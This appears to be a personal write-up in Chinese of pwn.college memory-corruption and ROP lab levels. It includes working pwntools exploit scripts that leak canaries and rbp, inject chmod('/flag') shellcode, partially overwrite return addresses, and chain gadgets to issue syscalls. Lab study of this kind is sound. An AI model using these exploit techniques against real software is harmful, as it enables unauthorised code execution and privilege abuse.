<h4 id="level8-1"><a href="#level8-1" class="headerlink" title="level8"></a>level8</h4><p>这题在上一题的基础之上加了canary和PIE.</p>
<p>其余部分应该是一样的, 溢出点也是一样的. 对了, write函数也没有边界检查, 可以利用这个来leak出canary和rbp.</p>
<h4 id="level9-1"><a href="#level9-1" class="headerlink" title="level9"></a>level9</h4><p>保护半开, 可用open, <strong>disallowed read_code</strong>, no bundary check in read, but write has.</p>
<p>只允许byte code中出现一次syscall.</p>
<p>但是发现read_memory的目的地变成了指令的区域. 于是就可以使用这个调用来输入新的代码去覆盖旧的.</p>
<h4 id="level10-1"><a href="#level10-1" class="headerlink" title="level10"></a>level10</h4><p>这次在上一题的基础上补上了read_memory的错误, 仍然只能用用一次syscall. <strong>边界检查全开</strong>.</p>
<p>这???</p>
<h4 id="level11-1"><a href="#level11-1" class="headerlink" title="level11"></a>level11</h4><p>JIT pray, Yan85_64, 保护全开, 全新逻辑, 暂且放弃.</p>
<h1 id="module-9-mem"><a href="#module-9-mem" class="headerlink" title="module 9-mem"></a>module 9-mem</h1><p>nothing special.</p>
<h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><p>canary disabled.</p>
<p>inject shellcode to a map region, and then overwrite return address to jmp to executing shellcode.</p>
<h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><p>保护全关. 可执行栈. 确实没有什么东西, 没开PIE的话栈的位置都是一样的, shellcode注入的地点也可以使用绝对地址来确定.</p>
<h4 id="level3-1"><a href="#level3-1" class="headerlink" title="level3"></a>level3</h4><img src="../../image/pwn-modules/image-20220430102917561.png" srcset="/img/loading.gif" lazyload alt="image-20220430102917561" style="zoom:80%;" />

<p>栈上的地址最低12位都是随机的. 怕不是每次运行的时候_start和__libc_start_main函数都会用到不同的栈空间大小…也许是aslr把stackbase也改了.<br>这下子只能连rbp都给leak出来了.</p>
<ol>
<li>first exec <code>challenge</code> to <strong>leak canary</strong> and inject <strong>shellcode</strong>.</li>
<li>second exec to leak first challenge’s <strong>rbp</strong>, and then calc the shellcode position.</li>
<li>third exec to jmp to shellcode.</li>
</ol>
<p><del>不对, 第一次leak canary的时候也可以leak出main的rbp,</del> 没事了, main的rbp可以用但没必要.</p>
<ul>
<li>没有push imm64这条指令.</li>
<li>一开始用chmod+.ascii “flag”的做法, 发现自己加了一个空字符, 只能通过栈来尝试. 想了想, 栈指针加8也不会对第一个challenge的栈帧造成什么影响. 换成下面这个, 注意小端法.<br><code>[hex(ord(character)) for character in &#39;/flag&#39;] =&gt; [&#39;0x2f&#39;, &#39;0x66&#39;, &#39;0x6c&#39;, &#39;0x61&#39;, &#39;0x67&#39;]</code> </li>
<li>没料到手写shellcode会有一堆的空字符. 放弃手写, 转为pwntool生成.</li>
<li>size写太大, REPEAT后面的换行符都给读进去了.</li>
<li>招架不住canary和rbp里面也有空字符…多试几次就行了</li>
<li>IDA变量定义错了, 存在一个指向字符数组的指针, read参数还出现了对buf的解引用, 半天没看出来.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#buf在rbp-0x38的位置, canary在rbp-0x8</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#binary = glob(&quot;/challenge/t*&quot;)[0]</span><br>binary = <span class="hljs-string">&quot;./toddlerone_level3.1.elf64&quot;</span><br>context.binary = binary<br>p = process(binary) <br><br><span class="hljs-comment">#第一次leak canary</span><br>p.recvuntil(<span class="hljs-string">&quot;size: &quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;57&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;bytes)!\n&quot;</span>)<br>shellcode=shellcraft.amd64.chmod(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;0x04&#x27;</span>)<br>payload = asm(shellcode) <br>payload = payload.ljust(<span class="hljs-number">0x40</span>-<span class="hljs-number">8</span>-<span class="hljs-number">6</span>+<span class="hljs-number">1</span>)<br>payload += <span class="hljs-string">b&#x27;REPEAT&#x27;</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;REPEAT&#x27;</span>)<br>canary = p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;canary&#x27;</span>+canary)<br><br><span class="hljs-comment">#第二次leak rbp</span><br>p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-string">b&#x27;64&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x40</span>-<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;REPEAT&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;REPEAT&#x27;</span>)<br>rbp_byte = p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>rbp = <span class="hljs-built_in">int</span>.from_bytes(rbp_byte, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;rbp = &#x27;</span>+<span class="hljs-built_in">hex</span>(rbp))<br><br><span class="hljs-comment">#第三次执行shellcode.</span><br>p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-string">b&#x27;200&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x38</span>+canary+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(rbp-<span class="hljs-number">0x40</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br></code></pre></div></td></tr></table></figure>

<h4 id="level4-2"><a href="#level4-2" class="headerlink" title="level4"></a>level4</h4><p>看起来和上一题没有什么区别, 就是88字节的数组末尾8字节要是一个确定的数字才能正常return.</p>
<p>%s没有限制. executable stack.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#几乎一样的代码, 不打出来了.</span><br></code></pre></div></td></tr></table></figure>

<h4 id="level5-3"><a href="#level5-3" class="headerlink" title="level5"></a>level5</h4><p>else repeat加了一个seccomp, 感觉又没什么区别.</p>
<h4 id="level6-3"><a href="#level6-3" class="headerlink" title="level6"></a>level6</h4><p>这下子真有区别了, seccomp在challenge返回的时候无法避免. 保护一样, 仍然是可执行栈.</p>
<p>只允许write和exit_group. 这是能做的吗? 一次load剩下的执行流程都会被限制.</p>
<p>没事了, 我连他的限制的内容也可以修改. 改成我想要的就行了. 总共允许两个syscall.</p>
<p>改成90 chmod 91 fchmod就行.</p>
<h4 id="level7-2"><a href="#level7-2" class="headerlink" title="level7"></a>level7</h4><p>加上了PIE. 利用随机地址仍然是4KB对齐来修改最后两个字节, 不过最高四位只能碰运气了(\x29中的’2’)</p>
<ul>
<li>使用vim编辑二进制文件直接把非print字符整成一个问号存起来……换个办法修改好了…..</li>
<li>要么使用编辑器, 要么vim中使用<code>set binary</code>或<code>-b</code>参数, 然后<code>%!xxd</code> </li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x68</span> + <span class="hljs-string">b&#x27;\xa4\x29&#x27;</span><br></code></pre></div></td></tr></table></figure>

<h4 id="level8-2"><a href="#level8-2" class="headerlink" title="level8"></a>level8</h4><p>heap上malloc一个size区域, 七八十字节, 但是在这个区域中使用strlen, 在一堆ped中加入一个空字符即可. </p>
<p>而且加了PIE. 如同上一题的做法.</p>
<h4 id="level9-2"><a href="#level9-2" class="headerlink" title="level9"></a>level9</h4><p>保护全开. <a target="_blank" rel="noopener" href="https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro">RELRO</a> </p>
<p>最大的问题是开了canary.</p>
<p>嘶—-我知道了, 利用内存寻址可以跳过canary从而直接修改retaddr.</p>
<p>0x79下一个是0x80也是很可以. 下次写十六进制一定加前缀.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">92</span>+<span class="hljs-string">b&#x27;\x77\x1a\x3f&#x27;</span><br></code></pre></div></td></tr></table></figure>

<h4 id="level10-2"><a href="#level10-2" class="headerlink" title="level10"></a>level10</h4><p>已经将flag读到了栈上, 为了printf的%s能够打印出来, 把buf前面110个字节填充为非零, 紧接着就是flag内容, 这样%s的打印就不会在110处停止.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">110</span><br></code></pre></div></td></tr></table></figure>

<h4 id="level11-2"><a href="#level11-2" class="headerlink" title="level11"></a>level11</h4><p>保护全开, 这题是mmap的使用, 以前还没看过详细的机制. youtube的一个<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=8hVLcyBkSXY">视频</a>, 还不错.</p>
<p>一连几个mmap都是没有address hint的, 全都连在一起. 而且是向低地址方向map,  最后map的region反而在低地址.</p>
<img src="../../image/pwn-modules/image-20220426223702228.png" srcset="/img/loading.gif" lazyload alt="image-20220426223702228" style="zoom:80%;" />

<p>最后的map只指定了0x5c个字节, 不过还是分配了0x1000一整个page, 全为可写可读. <strong>没搞懂的是为什么/flag映射的是只能执行也可以被printf读取出来</strong>..</p>
<p>所以结果也很简单, 0x3000字节即可.</p>
<h4 id="level12-1"><a href="#level12-1" class="headerlink" title="level12"></a>level12</h4><p>仍然是全开.</p>
<p>能重复执行challenge, 难不成是leak canary? 而且还有printf %s.</p>
<ul>
<li>第一次0x19个(因为buf和canary之间有undefined区域)填充字符, leak出canary, 然后再次进入challenge</li>
<li>为了能跳转到win, 必须执行完challenge, 即通过canary验证. 第一次执行覆盖了canary第一字节必定不成功, 第二次利用leak出的canary来通过验证并且修改返回地址的低两字节.</li>
<li>这么一说感觉得用pwntools来写了.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    p = process(<span class="hljs-string">&#x27;./babymem_level12.1.elf64&#x27;</span>)<br><br>    p.sendline(<span class="hljs-string">b&#x27;25&#x27;</span>)<br>    pl = <span class="hljs-string">b&#x27;REPEAT&#x27;</span>.rjust(<span class="hljs-number">0x20</span>-<span class="hljs-number">8</span>+<span class="hljs-number">1</span>)<br>    p.sendline(pl)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;REPEAT&#x27;</span>)<br>    canary = p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(canary)<br>    p.sendline(<span class="hljs-string">b&#x27;42&#x27;</span>)<br>    pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span> + canary+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">b&#x27;\xa4\x23&#x27;</span><br>    p.sendline(pl)                             <br><br>    <span class="hljs-built_in">all</span> = p.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">all</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">all</span>)<br>        <span class="hljs-keyword">break</span>	<span class="hljs-comment">#一直试到成功为止.</span><br>    <span class="hljs-comment">#break</span><br></code></pre></div></td></tr></table></figure>

<h4 id="level13-1"><a href="#level13-1" class="headerlink" title="level13"></a>level13</h4><p>大满开!</p>
<p>重复利用没有清空的堆栈内容. flag在<code>rbp-0x10f</code>开始的0x100字节上. 所以在challenge栈帧中也从这个位置读取即可. 神奇的是有一大块空间没有被定义. 或许是定义了一个数组然后没有使用? 这样的话还不能被编译器优化掉.</p>
<p>v5从rbp-0x120开始, 填上0x20 byte is enough.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">17</span>                                                    <br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/mnt/hgfs/LearingList/pwn.college/input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(<span class="hljs-string">b&#x27;17\n&#x27;</span>+pl)<br></code></pre></div></td></tr></table></figure>

<h4 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h4><p>也是leak canary, the problem is printf() function limit the number of bytes to be output to 452, while buf size if 456 bytes. </p>
<p>………….</p>
<h4 id="level15-1"><a href="#level15-1" class="headerlink" title="level15"></a>level15</h4><p>TCP连接, 利用fork的特点来绕过canary.</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">tcp_socket = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>udp_socket = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);<br>raw_socket = socket(AF_INET, SOCK_RAW, protocol);<br></code></pre></div></td></tr></table></figure>

<ul>
<li><a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/tubes/sockets.html">https://docs.pwntools.com/en/stable/tubes/sockets.html</a>, exempli gratia:</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">In [<span class="hljs-number">8</span>]: <span class="hljs-keyword">import</span> pwn <br>   ...:  <br>   ...: pwn.context.encoding = <span class="hljs-string">&quot;latin-1&quot;</span> <br>   ...:  <br>   ...: <span class="hljs-keyword">with</span> pwn.process(<span class="hljs-string">&quot;/challenge/babymem_level15.0&quot;</span>) <span class="hljs-keyword">as</span> target: <br>   ...:     <span class="hljs-keyword">with</span> pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1337</span>) <span class="hljs-keyword">as</span> remote: <br>   ...:         remote.writeafter(<span class="hljs-string">b&quot;Payload size:&quot;</span>, <span class="hljs-string">b&quot;100\n&quot;</span>) <br>   ...:         remote.writeafter(<span class="hljs-string">b&quot;Send your payload&quot;</span>, <span class="hljs-string">b&quot;test&quot;</span>) <br>   ...:         pwn.info(remote.clean().decode()) <br>   ...:                                                                                                                                                       <br>[x] Starting local process <span class="hljs-string">&#x27;/challenge/babymem_level15.0&#x27;</span><br>[+] Starting local process <span class="hljs-string">&#x27;/challenge/babymem_level15.0&#x27;</span>: pid <span class="hljs-number">7046</span><br>[x] Opening connection to localhost on port <span class="hljs-number">1337</span><br>[x] Opening connection to localhost on port <span class="hljs-number">1337</span>: Trying <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>[+] Opening connection to localhost on port <span class="hljs-number">1337</span>: Done<br>[*]  (up to <span class="hljs-number">100</span> <span class="hljs-built_in">bytes</span>)!<br>    You sent <span class="hljs-number">4</span> <span class="hljs-built_in">bytes</span>!<br>    Let<span class="hljs-string">&#x27;s see what happened with the stack</span><br></code></pre></div></td></tr></table></figure>



<h1 id="module-A-rop"><a href="#module-A-rop" class="headerlink" title="module A-rop"></a>module A-rop</h1><p>ROP</p>
<ul>
<li>rp++, ROPgadget.<ul>
<li><code>rp++ --unique -r2 -f /bin/bash | grep -P &quot;(add|sub|mov) rax, r..&quot;</code> </li>
</ul>
</li>
<li>store addresses into registers</li>
<li>stack pivot: 栈转移.</li>
<li>data transfer.</li>
<li>USE INFO IN THE STACK OR REGISTERS.</li>
</ul>
<p>Counter-CFI(Control Flow Integrity) techniques:</p>
<ul>
<li><input disabled="" type="checkbox"> <strong>B(lock)OP:</strong> ROP on a block (or multi-block) level by carefully compensating for side-effects.</li>
<li><input checked="" disabled="" type="checkbox"> <strong>J(ump)OP:</strong> instead of returns, use indirect jumps to control execution flow</li>
<li><input disabled="" type="checkbox"> <strong>C(all)OP:</strong> instead of returns, use indirect calls to control execution flow</li>
<li><input checked="" disabled="" type="checkbox"> <strong>S(ignreturn)ROP:</strong> instead of returns, use the sigreturn system call </li>
<li><input disabled="" type="checkbox"> <strong>D(ata)OP:</strong> instead of hijacking control flow, carefully overwrite the program’s data to puppet it</li>
</ul>
<p><strong>Intel Edition(endbr64 after ret instruction)</strong> is still bypassable by some advanced ROP techniques (<u>Block Oriented Programming, SROP, etc</u>), but it will significantly complicate exploitation.</p>
<p><a target="_blank" rel="noopener" href="http://www.scs.stanford.edu/brop/bittau-brop.pdf">Hacking blind</a>:</p>
<ul>
<li>The standard blind attack requires a <strong>forking service</strong>. 就像</li>
<li>Break ASLR and the canary byte-by-byte. Now we can redirect memory semi-controllably.</li>
<li>Redirect memory until we have a <em>survival signal</em> (i.e., an address that doesn’t crash).</li>
<li>Use the survival signal to find non-crashing ROP gadgets.</li>
<li>Find functionality to produce output.</li>
<li>Leak the program.</li>
<li>Hack it.</li>
</ul>
<p>所谓的libc.so.6其实也就是一个符号链接. 如果要更改libc文件直接临时修改一下符号链接<strong>还要注意ld和libc的匹配问题</strong>. 或者使用patchelf改一下, 链接<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-254868-1.htm">在这</a>. (那个glibc_all_in_one就在这儿用的)(成天用的都是工具, 真想自己写一个)</p>
<img src="../../image/pwn-modules/image-20220507102703295.png" srcset="/img/loading.gif" lazyload alt="image-20220507102703295" style="zoom:80%;" />

<blockquote>
<p>YouTube-42视频是rop的新用法… pwntool还内置了rop. 真行啊.</p>
</blockquote>
<h4 id="level1-1"><a href="#level1-1" class="headerlink" title="level1"></a>level1</h4><p>啥主要的保护也没开, 简单的覆盖返回地址.</p>
<h4 id="level2-1"><a href="#level2-1" class="headerlink" title="level2"></a>level2</h4><p>没开啥保护, 查了一下lseek的使用, 主要就是win函数分成了两个阶段, 一次读一半.</p>
<p>只要在栈上弄两个返回地址就行了. 简单</p>
<h4 id="level3-2"><a href="#level3-2" class="headerlink" title="level3"></a>level3</h4><p>5个stage, 每个stage都要有对应数字的参数, 简单跳过.</p>
<h4 id="level4-3"><a href="#level4-3" class="headerlink" title="level4"></a>level4</h4><p>有一整个函数用来提供gadgets.</p>
<img src="../../image/pwn-modules/image-20220505210342026.png" srcset="/img/loading.gif" lazyload alt="image-20220505210342026" style="zoom:80%;" />

<p>利用这几个gadgets就可以实现chmod系统调用了. (或者execve)</p>
<p>rdi是’/flag’字符串的地址, 存在栈上. 鉴于栈空间会不断的减少, 就存在challenge的栈帧中. </p>
<p>好吧, 这栈地址会变化的. 大意了, 栈帧底部有一个变量.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level4.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p=process(binary)<br>p.recvuntil(<span class="hljs-string">b&#x27; at: 0x&#x27;</span>)<br>buf = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>rbp = buf + <span class="hljs-number">0x50</span><br>log.info(<span class="hljs-built_in">hex</span>(rbp))<br>sc = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">init-pwndbg</span><br><span class="hljs-string">si</span><br><span class="hljs-string">b *challenge+86</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#gdb.attach(p, gdbscript=sc)</span><br>pl = flat([<span class="hljs-string">b&#x27;/flag\x00&#x27;</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">6</span>), <span class="hljs-number">0</span>, <span class="hljs-number">0x4015fb</span>, buf, <span class="hljs-number">0x40161b</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x40160c</span>, <span class="hljs-number">90</span>, <span class="hljs-number">0x4015e3</span>])<br>p.sendline(pl)<br>p.interactive()<br></code></pre></div></td></tr></table></figure>

<h4 id="level5-4"><a href="#level5-4" class="headerlink" title="level5"></a>level5</h4><p>这一题在上一题的基础之上, 没有提示buf的所在位置.</p>
<p>突然想起来babyjail里面有一个openat. 我或许可以用<code>fchmodat</code>.</p>
<p>想出来了一个奇奇怪怪的方法, 在IDA中搜索到了字节序列<code>&#39;\x66\x00&#39;</code>, 就是字符串<code>f\0</code>的表示,<br>在这之前要先使用<code>ln -s /flag /home/hacker/f</code>命令来创建符号链接, 再使用python来生成input,<br>最后再命令行中这样执行文件<code>/challenge/babyrop_level5.1 &lt;input 6&lt;.</code>, 这样就行了.<br>或许可以使用别的字符串. 比如一些函数名.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level4.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#连续装四个参数和rax系统调用号.</span><br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x20</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x401d7b</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0x401d63</span>, <span class="hljs-number">0x403EC8</span>, <span class="hljs-number">0x401d5c</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x401d54</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x401d74</span>, <span class="hljs-number">268</span>, <span class="hljs-number">0x401d8b</span>])<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(pl)<br></code></pre></div></td></tr></table></figure>

<p>想出来这个是因为不知道怎么leak栈上的地址, 估计下几个level得直接完蛋吧…….</p>
<p><del>看以前的ctf发现也许可以使用write函数来打印栈上的内容, 肯定有一个指向栈上的指针的. 比如说main的rbp.</del>没事了, write的地址也得是指向栈的指针, 属于是鸡和蛋的问题, 暂时没有新方法.</p>
<h4 id="level6-4"><a href="#level6-4" class="headerlink" title="level6"></a>level6</h4><p>这次没有了syscall, 只有一个现成的函数<code>force_import</code>, gadget也少了几个. 不过也简单. 保护没有变化.</p>
<img src="../../image/pwn-modules/image-20220506101348091.png" srcset="/img/loading.gif" lazyload alt="image-20220506101348091" style="zoom:80%;" />

<p>再加上challenge结束时的寄存器值:</p>
<img src="../../image/pwn-modules/image-20220506104816965.png" srcset="/img/loading.gif" lazyload alt="image-20220506104816965" style="zoom:80%;" />

<p>这样的话只要改改rdi rsi. (open多参数到底有没有问题???)</p>
<ul>
<li>但是rsi同时作为open的oflag和sendfile的in_fd, 按理来说open一般会开出来3, 那么oflag就得是3了, 但很明显不能是3, 这样标志位会有冲突. 那么用一个文件占用fd3, 这样就会开到4. 如果oflag是4的话会被识别为只读. </li>
<li>接下来就是rdi的问题, open的参数是一个指向字符串的地址(‘e’, null-terminal string at 0x400457), 还要被用在sendfile的out_fd中, 而fd是int类型, 加上文件固定低地址执行, 这样子还要在命令行中开一个fd为4195415(0x400457)的输出文件.</li>
</ul>
<p>然后发现bash并不能打开超过9的fd. 由操作系统分配的fd, bash是怎么控制的? 为什么只提供0-9?</p>
<p>一次执行这个函数有困难也可以执行两次.</p>
<ul>
<li>第一次open(‘e’, 4), send(‘f’, 4, 0, 0x7f……), sendfile失败.</li>
<li>第二次直接跳到sendfile(1, 3, 0, 60), 因为open函数会修改rdi rsi等等, 从函数入口开始执行那ROP设置的寄存器值就失效了.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level4.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">0x8</span>), <span class="hljs-number">0x401b6a</span>, <span class="hljs-number">0x400458</span>, <span class="hljs-number">0x401b82</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x401B3F</span>])<br>pl+= flat([<span class="hljs-number">0x401b6a</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0x401b82</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0x401b7a</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x401b72</span>, <span class="hljs-number">60</span>, <span class="hljs-number">0x401B56</span>, <span class="hljs-number">0</span>])<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(pl)<br></code></pre></div></td></tr></table></figure>

<hr>
<ul>
<li>我开了aslr才能在gdb里面进行输入, 具体原因未知.</li>
<li>搞清楚了open的一些东西<ul>
<li>oflag用4字节中最低2bits表示, 按数值区别. mode参数只有在创建新文件的时候使用, <strong>一般可忽略</strong>.</li>
<li>libc中的open函数最终都会调用openat, 这样既能接受绝对地址也能接受相对地址.</li>
</ul>
</li>
</ul>
<h4 id="level7-3"><a href="#level7-3" class="headerlink" title="level7"></a>level7</h4><p>直接给我system函数的地址.</p>
